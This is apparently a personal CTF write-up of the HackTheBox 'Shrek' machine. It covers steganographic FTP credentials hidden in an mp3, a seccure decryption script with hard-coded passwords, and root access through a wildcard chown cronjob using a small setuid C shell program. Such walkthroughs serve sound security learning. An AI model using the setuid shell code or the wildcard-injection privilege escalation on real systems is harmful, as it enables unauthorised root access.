---
title: "HackTheBox - Shrek (Steganography)"
categories:
  - blog
  - posts
---
Shrek was I believe one of the original boxes released way back in 2018, it has a lot of elements to it that resemble a CTF more than a traditional pentest practice.

# User 
Went into uploads, found a php rev shell alluding to an area 51 directory, went there and downloaded an .mp3. Cut the end of the .mp3 which was just static noise, put it into spectrogram (which required max frequency on spectogram scale settings) and we got an ftp login.

![image](https://github.com/user-attachments/assets/0f79b394-1fcb-426e-9769-b78a647113ec)

did `mget *.txt` to download everything within.

`for i in $(ls *.txt); do echo $i; base64 -d $i > sneed; done` showed us two files that stuck out as they couldn’t be decoded because of spaces inside, one had the password `PrinceCharming`

The other one had a weird mix of asci and hex. We had to use the seccure library to decode it.

```python
`import seccure`

`ct = b'\x01\xd3\xe1\xf2\x17T \xd0\x8a\xd6\xe2\xbd\x9e\x9e~P(\xf7\xe9\xa5\xc1KT\x9aI\xdd\\!\x95t\xe1\xd6p\xaa"u2\xc2\x85F\x1e\xbc\x00\xb9\x17\x97\xb8\x0b\xc5y\xec<K-gp9\xa0\xcb\xac\x9et\x89z\x13\x15\x94Dn\xeb\x95\x19[\x80\xf1\xa8,\x82G`\xee\xe8C\xc1\x15\xa1~T\x07\xcc{\xbd\xda\xf0\x9e\x1bh\'QU\xe7\x163\xd4F\xcc\xc5\x99w'`

`plaintext = seccure.decrypt(ct, b"PrinceCharming")`

`print(plaintext)`
```

Our output is the password for the SSH key!
`b'The password for the ssh file is: shr3k1sb3st! and you have to ssh in as: sec\n'`

# Privilege Escalation
Privesc was very specific and actually had a rabbit hole in sudo -l where you could run a binary as farquad that didn’t actually do anything. We look for recently modified files in between the timeframe the user.txt was made

`find / -type f -newermt 2017-08-20 ! -newermt 2017-08-25 2>/dev/null`

here’s a cronjob so we can just run pspy to catch it.

[`/bin/sh -c cd /usr/src; /usr/bin/chown nobody:nobody *`](https://www.exploit-db.com/papers/33930)

https://www.exploit-db.com/papers/33930

I tried doing it with a local copy of bash but it didn’t work so I had to just make my own

`#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main( int argc, char *argv[] )
{
setreuid(0, 0);
execve("/bin/sh", NULL, NULL);
}`

`gcc final.c -o final`

wait 5 minutes for the crontab, run it, and you're root.
